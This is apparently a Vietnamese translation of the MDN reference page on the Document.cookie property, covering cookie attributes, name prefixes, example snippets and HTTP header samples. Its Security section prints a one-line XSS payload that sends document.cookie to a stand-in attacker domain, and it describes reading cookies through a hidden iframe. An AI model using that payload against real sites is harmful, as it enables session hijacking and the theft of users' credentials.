---
title: "Document: thuộc tính cookie"
short-title: cookie
slug: Web/API/Document/cookie
page-type: web-api-instance-property
browser-compat: api.Document.cookie
---

{{APIRef("DOM")}}

Thuộc tính `cookie` của {{domxref("Document")}} cho phép bạn đọc và ghi [cookie](/en-US/docs/Web/HTTP/Guides/Cookies) liên kết với tài liệu. Nó đóng vai trò là getter và setter cho các giá trị cookie thực tế.

> [!NOTE]
> `document.cookie` có thể là nguyên nhân gây ra vấn đề hiệu suất vì đây là API đồng bộ và chặn main thread khi đọc cookie qua các tiến trình hoặc thực hiện các thao tác I/O. Nếu có thể, nhà phát triển nên sử dụng [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) không đồng bộ để quản lý cookie.

## Giá trị

Một chuỗi chứa danh sách tất cả cookie được phân tách bằng dấu chấm phẩy (tức là các cặp `key=value`). Lưu ý rằng mỗi _key_ và _value_ có thể được bao quanh bởi khoảng trắng (ký tự space và tab): trên thực tế, {{RFC(6265)}} yêu cầu một khoảng trắng sau mỗi dấu chấm phẩy, nhưng một số user agent có thể không tuân thủ điều này.

Bạn cũng có thể gán cho thuộc tính này một chuỗi có dạng `"key=value"`, chỉ định cookie cần đặt/cập nhật. Lưu ý rằng bạn chỉ có thể đặt/cập nhật một cookie mỗi lần sử dụng phương thức này. Cân nhắc thêm rằng:

- Bất kỳ thuộc tính cookie nào sau đây có thể tùy chọn theo sau cặp key-value, mỗi thuộc tính đứng trước một dấu chấm phẩy phân cách:
  - `;domain=domain` (ví dụ: `example.com` hoặc `subdomain.example.com`): Host mà cookie sẽ được gửi đến. Nếu không được chỉ định, mặc định là phần host của vị trí tài liệu hiện tại và cookie không khả dụng trên các subdomain. Nếu domain được chỉ định, các subdomain luôn được bao gồm. Trái ngược với các đặc tả trước đó, các dấu chấm đứng đầu trong tên domain bị bỏ qua, nhưng các trình duyệt có thể từ chối đặt cookie chứa các dấu chấm đó.

    > [!NOTE]
    > Domain _phải_ khớp với domain của nguồn gốc JavaScript. Việc đặt cookie cho domain nước ngoài sẽ bị bỏ qua âm thầm.

  - `;expires=date-in-UTCString-format`: Ngày hết hạn của cookie. Nếu không chỉ định `expires` hoặc `max-age`, nó sẽ hết hạn khi kết thúc phiên.

    > [!WARNING]
    > Khi quyền riêng tư của người dùng là mối quan tâm, điều quan trọng là bất kỳ triển khai web app nào cũng phải vô hiệu hóa dữ liệu cookie sau một khoảng thời gian nhất định thay vì dựa vào trình duyệt làm điều đó. Nhiều trình duyệt cho phép người dùng chỉ định rằng cookie không bao giờ hết hạn, điều này không nhất thiết an toàn.

    Xem {{jsxref("Date.toUTCString()")}} để được hỗ trợ định dạng giá trị này.

  - `;max-age=max-age-in-seconds`: Tuổi tối đa của cookie tính bằng giây (ví dụ: `60*60*24*365` hoặc 31536000 cho một năm).

  - `;partitioned`: Cho biết cookie nên được lưu trữ bằng partitioned storage. Xem [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) để biết thêm chi tiết.

  - `;path=path`: Giá trị của thuộc tính `Path` của cookie (Xem [Xác định nơi cookie được gửi](/en-US/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) để biết thêm thông tin).

  - `;samesite`: Thuộc tính `SameSite` của header {{httpheader("Set-Cookie")}} có thể được server đặt để chỉ định khi nào cookie sẽ được gửi. Các giá trị có thể là `lax`, `strict` hoặc `none` (xem thêm [Kiểm soát cookie bên thứ ba với `SameSite`](/en-US/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
    - Giá trị `lax` sẽ gửi cookie cho tất cả các yêu cầu same-site và yêu cầu GET điều hướng top-level. Điều này đủ cho việc theo dõi người dùng, nhưng nó sẽ ngăn chặn nhiều cuộc tấn công [Cross-Site Request Forgery](/en-US/docs/Glossary/CSRF) (CSRF). Đây là giá trị mặc định trong các trình duyệt hiện đại.
    - Giá trị `strict` sẽ ngăn cookie được trình duyệt gửi đến trang đích trong tất cả các ngữ cảnh duyệt web cross-site, ngay cả khi theo một liên kết thông thường.
    - Giá trị `none` tuyên bố rõ ràng rằng không có hạn chế nào được áp dụng. Cookie sẽ được gửi trong tất cả các yêu cầu—cả cross-site và same-site.

  - `;secure`: Chỉ định rằng cookie chỉ được truyền qua giao thức an toàn.

- Chuỗi giá trị cookie có thể sử dụng {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} để đảm bảo chuỗi không chứa bất kỳ dấu phẩy, chấm phẩy hoặc khoảng trắng nào (không được phép trong giá trị cookie).
- Tên cookie có thể có tiền tố áp đặt các hạn chế cụ thể đối với thuộc tính của cookie trong các user agent hỗ trợ. Tất cả tiền tố cookie bắt đầu bằng dấu gạch dưới kép (`__`) và kết thúc bằng dấu gạch ngang (`-`). Các tiền tố sau được định nghĩa:
  - **`__Secure-`**: Cookie có tên bắt đầu bằng `__Secure-` phải được đặt với thuộc tính `Secure` bởi một trang an toàn (HTTPS).
  - **`__Host-`**: Cookie có tên bắt đầu bằng `__Host-` phải được đặt với thuộc tính `Secure` bởi một trang an toàn (HTTPS). Ngoài ra, chúng không được có thuộc tính `Domain` và thuộc tính `Path` phải được đặt thành `/`. Điều này đảm bảo các cookie như vậy chỉ được gửi đến host đã đặt chúng, chứ không phải bất kỳ host nào khác trên domain.
  - **`__Http-`**: Cookie có tên bắt đầu bằng `__Http-` phải được đặt với cờ `Secure` bởi một trang an toàn (HTTPS) và ngoài ra phải có thuộc tính `HttpOnly` được đặt để chứng minh rằng chúng được đặt qua header `Set-Cookie`.
  - **`__Host-Http-`**: Cookie có tên bắt đầu bằng `__Host-Http-` phải được đặt với cờ `Secure` bởi một trang an toàn (HTTPS) và phải có thuộc tính `HttpOnly` được đặt để chứng minh rằng chúng được đặt qua header `Set-Cookie`. Ngoài ra, chúng cũng có các hạn chế giống như cookie có tiền tố `__Host-`.

  > [!NOTE]
  > Dấu gạch ngang được coi là một phần của tiền tố.

  > [!NOTE]
  > Các cờ này chỉ có thể đặt được với thuộc tính `secure`.

> [!NOTE]
> Thuộc tính `document.cookie` là một [accessor property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) với các hàm _setter_ và _getter_ gốc, và do đó không phải là [data property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) có giá trị: những gì bạn ghi không giống với những gì bạn đọc, mọi thứ luôn được trung gian bởi JavaScript interpreter.

## Ví dụ

### Ví dụ 1: Sử dụng đơn giản

```html
<button id="show">Hiện cookie</button>
<button id="clear">Xóa</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Lưu ý rằng chúng ta đang đặt `SameSite=None;` trong ví dụ này vì ví dụ
// cần hoạt động cross-origin.
// Thông thường hơn là không đặt thuộc tính `SameSite`, dẫn đến giá trị mặc định,
// và an toàn hơn, là `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Ví dụ 2: Lấy một cookie mẫu tên là test2

```html
<button id="show">Hiện giá trị cookie</button>
<button id="clear">Xóa</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Ví dụ 3: Chỉ làm điều gì đó một lần

Để sử dụng mã sau, vui lòng thay thế tất cả các xuất hiện của từ `doSomethingOnlyOnce` (tên của cookie) bằng một tên tùy chỉnh.

```html
<button id="do-once">Chỉ làm một lần</button>
<button id="clear">Xóa</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Làm điều gì đó ở đây!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Ví dụ 4: Đặt lại cookie trước đó

```html
<button id="reset">Đặt lại cookie chỉ một lần</button>
<button id="clear">Xóa</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Đã đặt lại!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Ví dụ 5: Kiểm tra sự tồn tại của một cookie

```html
<button id="check">Kiểm tra cookie tồn tại</button>
<button id="clear">Xóa</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> Cookie "reader" tồn tại';
  } else {
    output.textContent = '> Cookie "reader" không tồn tại';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Ví dụ 6: Kiểm tra cookie có giá trị cụ thể

```html
<button id="check">Kiểm tra cookie có giá trị cụ thể</button>
<button id="clear">Xóa</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> Cookie "reader" có giá trị là "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Bảo mật

Điều quan trọng cần lưu ý là thuộc tính `path` không _bảo vệ_ cookie khỏi việc đọc trái phép từ một đường dẫn khác. Nó có thể dễ dàng bị vượt qua bằng DOM, ví dụ bằng cách tạo một phần tử {{HTMLElement("iframe")}} ẩn với đường dẫn của cookie, sau đó truy cập thuộc tính `contentDocument.cookie` của iframe này. Cách duy nhất để bảo vệ cookie là sử dụng một domain hoặc subdomain khác, do [same origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).

Cookie thường được sử dụng trong các ứng dụng web để xác định người dùng và phiên đã xác thực của họ. Việc đánh cắp cookie từ một ứng dụng web dẫn đến việc chiếm quyền phiên của người dùng đã xác thực. Các cách phổ biến để đánh cắp cookie bao gồm sử dụng [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) hoặc khai thác lỗ hổng [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) trong ứng dụng:

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Thuộc tính cookie `HTTPOnly` có thể giúp giảm thiểu cuộc tấn công này bằng cách ngăn chặn truy cập vào giá trị cookie thông qua JavaScript. Đọc thêm về [Cookie và Bảo mật](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Ghi chú

- Bắt đầu từ Firefox 2, một cơ chế tốt hơn cho lưu trữ phía client là [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API).
- Bạn có thể xóa cookie bằng cách cập nhật thời gian hết hạn của nó về 0.
- Hãy nhớ rằng bạn càng có nhiều cookie, càng nhiều dữ liệu sẽ được chuyển giữa server và client cho mỗi yêu cầu. Điều này sẽ làm mỗi yêu cầu chậm hơn. Bạn nên sử dụng [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API) nếu bạn định lưu dữ liệu "chỉ client".
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Phần 5.3, "Giới hạn triển khai") chỉ ra rằng **không có độ dài tối đa** cho kích thước key hoặc value của cookie và khuyến khích các triển khai hỗ trợ **cookie lớn tùy ý**. Mỗi trình duyệt sẽ có giới hạn tối đa khác nhau, hãy tham khảo tài liệu của từng trình duyệt.

Lý do cho sự bất đối xứng giữa getter và setter của thuộc tính `document.cookie` là do tính chất client-server của cookie, khác với các phương thức lưu trữ client-client khác (như [localStorage](/en-US/docs/Web/API/Web_Storage_API)):

- Server báo client lưu cookie:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- Client gửi lại cookie đã lưu cho server:

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## Đặc tả kỹ thuật

{{Specifications}}

## Tương thích trình duyệt

{{Compat}}

## Xem thêm

- [HTTP cookies](/en-US/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/en-US/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/en-US/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
